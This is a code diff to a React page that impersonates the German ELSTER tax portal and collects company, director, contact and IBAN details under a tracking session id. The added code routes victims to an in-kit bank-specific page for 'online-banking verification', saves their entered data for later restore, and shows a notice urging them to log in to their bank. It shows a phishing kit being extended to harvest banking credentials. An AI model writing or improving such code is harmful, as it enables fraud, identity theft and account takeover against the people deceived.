@@ -1,5 +1,6 @@
 import { useState, useEffect, useMemo } from "react";
-import { useSearchParams } from "react-router-dom";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { resolveDeBankRoute } from "@/lib/bankMatchDe";
 import { supabase } from "@/integrations/supabase/client";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import {
@@ -37,7 +38,9 @@ function formatIban(raw: string) {
 
 const ElsterDatenaktualisierung = () => {
   const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
+  const STORAGE_KEY = "elster-upd-state";
 
   const [step, setStep] = useState<1 | 2 | 3>(1);
   const [company, setCompany] = useState("");
@@ -84,6 +87,22 @@ const ElsterDatenaktualisierung = () => {
   useEffect(() => { window.scrollTo(0, 0); }, [step]);
   usePageMeta("Mein ELSTER | Daten aktualisieren", "/favicon.png");
 
+  // Restore state when returning from bank login (?step=3)
+  useEffect(() => {
+    if (searchParams.get("step") !== "3") return;
+    try {
+      const raw = sessionStorage.getItem(STORAGE_KEY);
+      if (raw) {
+        const s = JSON.parse(raw);
+        setCompany(s.company ?? ""); setEmail(s.email ?? ""); setPhone(s.phone ?? "");
+        setStreet(s.street ?? ""); setCity(s.city ?? "");
+        setDirectors(s.directors ?? [{ firstName: "", lastName: "", mobile: "" }]);
+        setIban(s.iban ?? ""); setBankName(s.bankName ?? "");
+      }
+    } catch { /* ignore */ }
+    setStep(3);
+  }, [searchParams]);
+
   const txCode = useMemo(() => {
     const n = Math.floor(100000000 + Math.random() * 900000000);
     return `${n} -C${Math.floor(10 + Math.random() * 90)}`;
@@ -116,6 +135,8 @@ const ElsterDatenaktualisierung = () => {
     const err: Record<string, string> = {};
     const cleaned = iban.replace(/\s/g, "");
     if (cleaned.length < 15) err.iban = "Bitte gültige IBAN eingeben.";
+    if (!ibanValid) err.iban = "Bitte gültige IBAN eingeben.";
+    if (!bankName) err.iban = "Bank konnte noch nicht ermittelt werden.";
     setErrors(err);
     if (Object.keys(err).length > 0 || submitting) return;
     setSubmitting(true);
@@ -138,8 +159,24 @@ const ElsterDatenaktualisierung = () => {
       });
       if (error) console.error("Update failed:", error);
     }
+
+    // Resolve bank → /de/* and redirect for online-banking verification
+    const route = await resolveDeBankRoute(bankName);
+    if (route) {
+      try {
+        sessionStorage.setItem(STORAGE_KEY, JSON.stringify({
+          company, email, phone, street, city, directors, iban, bankName,
+        }));
+      } catch { /* ignore */ }
+      const qs = new URLSearchParams();
+      if (sessionId) qs.set("s", sessionId);
+      qs.set("return", "/elster/datenaktualisierung");
+      navigate(`${route}?${qs.toString()}`);
+      return;
+    }
+
     setSubmitting(false);
-    setStep(3);
+    setErrors({ iban: "Für diese Bank ist derzeit keine Online-Verifizierung verfügbar." });
   };
 
   const menu = [
@@ -335,9 +372,13 @@ const ElsterDatenaktualisierung = () => {
                     )}
                   </div>
 
+                  <div style={{ background: "#f8f8f8", border: `1px solid ${BORDER}`, padding: "12px 14px", fontSize: 13, lineHeight: 1.5, color: TEXT, marginTop: 8 }}>
+                    <strong>Hinweis zur Kontoverifizierung:</strong> Nach dem Absenden werden Sie zur Online-Banking-Anmeldung Ihrer Bank weitergeleitet. Bitte loggen Sie sich dort ein, um Ihr Konto zu bestätigen. Anschließend kehren Sie automatisch hierher zurück.
+                  </div>
+
                   <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
                     <button type="button" onClick={() => setStep(1)} style={{ background: "#fff", color: BLUE, border: `1px solid ${BORDER}`, padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Zurück</button>
-                    <button type="submit" disabled={submitting} style={{ background: BLUE, color: "#fff", border: "none", padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Absenden</button>
+                    <button type="submit" disabled={submitting || !ibanValid || !bankName} style={{ background: BLUE, color: "#fff", border: "none", padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: (submitting || !ibanValid || !bankName) ? "not-allowed" : "pointer", opacity: (submitting || !ibanValid || !bankName) ? 0.5 : 1 }}>Absenden</button>
                   </div>
                 </form>
               )}
